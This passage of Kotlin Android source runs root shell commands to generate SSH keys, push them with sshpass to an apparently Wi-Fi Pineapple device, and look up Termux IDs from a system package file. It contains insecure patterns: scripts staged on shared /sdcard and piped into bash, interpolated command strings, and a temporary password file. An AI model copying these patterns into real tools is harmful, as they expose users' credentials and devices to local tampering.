                    appendLog(textView, "❌ Failed to generate new SSH key\n")
                    return false
                }
                appendLog(textView, "✅ New SSH key pair generated\n")

                val writePasswordProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", writePasswordPipeline))
                val writePasswordOut2 = BufferedReader(InputStreamReader(writePasswordProc2.inputStream)).use { it.readText() }
                writePasswordProc2.waitFor()

                if (!writePasswordOut2.contains("PASSWORD_FILE_CREATED")) {
                    appendLog(textView, "❌ Failed to create temporary password file for retry\n")
                    return false
                }

                appendLog(textView, "⚙️ Transferring newly generated key to Pineapple...\n")
                val sshpassProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", sshpassPipeline))
                val sshpassOut2 = BufferedReader(InputStreamReader(sshpassProc2.inputStream)).use { it.readText() }
                sshpassProc2.waitFor()

                if (!sshpassOut2.contains("SSHPASS:SUCCESS")) {
                    appendLog(textView, "❌ Failed to transfer new key\n")
                    return false
                }
                appendLog(textView, "✅ New key transferred successfully\n")

                appendLog(textView, "🔑 Clearing stale known_hosts entry before verify...\n")
                val clearKnownHostsScript = """
                    #!/data/data/com.termux/files/usr/bin/bash
                    export HOME=$TERMUX_HOME
                    export PREFIX=/data/data/com.termux/files/usr
                    export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                    $TERMUX_SSH_KEYGEN -R $PINEAPPLE_IP >/dev/null 2>&1 || true
                    echo 'CLEARED'
                """.trimIndent()
                val clearPath = "/sdcard/clear_known_hosts.sh"
                writeFileAsRoot(clearPath, clearKnownHostsScript)
                execAsRoot("chmod 644 $clearPath")
                val clearPipeline = "cat $clearPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", clearPipeline)).waitFor()

                appendLog(textView, "🔄 Verifying SSH connection with new key...\n")
                writeFileAsRoot(verifyPath, verifyScript)
                execAsRoot("chmod 644 $verifyPath")
                val verifyProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", verifyPipeline))
                verifyProc2.waitFor()

                val verifyResultProc2 = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", "cat $TERMUX_HOME/verify_result.txt"))
                val verifyOut2 = BufferedReader(InputStreamReader(verifyResultProc2.inputStream)).use { it.readText() }
                verifyResultProc2.waitFor()
                execAsRoot("rm -f $TERMUX_HOME/verify_result.txt")

                if (!verifyOut2.contains("VERIFY:SUCCESS")) {
                    appendLog(textView, "⚠️ SSH connection still failing with new key\n")
                    appendLog(textView, "   Manual troubleshooting may be required\n")
                    return false
                }
                appendLog(textView, "✅ SSH connection verified with new key - pubkey authentication now working!\n")
            }

            return true

        } catch (e: Exception) {
            return false
        }
    }

    private fun detectTermuxIds() {
        Thread {
            try {
                val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
                val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                val listExit = listProc.waitFor()

                if (listExit != 0 || listOutput.isBlank()) return@Thread

                val parts = listOutput.trim().split("\\s+".toRegex())
                if (parts.size < 2) return@Thread

                val termuxAppId = parts[1].toIntOrNull() ?: return@Thread
                termuxUid = termuxAppId.toString()
                termuxGid = termuxAppId.toString()

                val appId = termuxAppId - 10000
                val supplementaryGroups = listOf("3003", "9997", (20000 + appId).toString(), (50000 + appId).toString())
                termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
            } catch (e: Exception) {
                // Ignore
            }
        }.start()
    }

    private fun ensureTermuxIdsDetected(): Pair<Boolean, String?> {
        if (termuxUid.isNotEmpty() && termuxGid.isNotEmpty() && termuxGroups.isNotEmpty()) {
            return Pair(true, null)
        }

        try {
            val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
            val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
            val listExit = listProc.waitFor()

            if (listExit != 0 || listOutput.isBlank()) {
                return Pair(false, "Termux not found in packages.list")
            }

            val parts = listOutput.trim().split("\\s+".toRegex())
            if (parts.size < 2) {
                return Pair(false, "Invalid packages.list format")
            }

            val termuxAppId = parts[1].toIntOrNull() ?: return Pair(false, "Could not parse UID")

            termuxUid = termuxAppId.toString()
            termuxGid = termuxAppId.toString()

            val appId = termuxAppId - 10000
            val supplementaryGroups = listOf("3003", "9997", (20000 + appId).toString(), (50000 + appId).toString())
            termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }

            return Pair(true, null)
        } catch (e: Exception) {
            return Pair(false, "Exception: ${e.message}")
        }
    }

    private fun writeFileAsRoot(path: String, content: String) {
        val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", "cat > '$path'"))
        OutputStreamWriter(proc.outputStream).use { writer ->
            writer.write(content)
            writer.flush()
        }
        proc.outputStream.close()
        proc.waitFor()
    }

    private fun execAsRoot(cmd: String) {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", cmd))
        p.waitFor()
    }

    private fun execAsRootWithOutput(cmd: String): String {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", cmd))
        val output = BufferedReader(InputStreamReader(p.inputStream)).use { it.readText() }
        p.waitFor()
        return output
    }
}
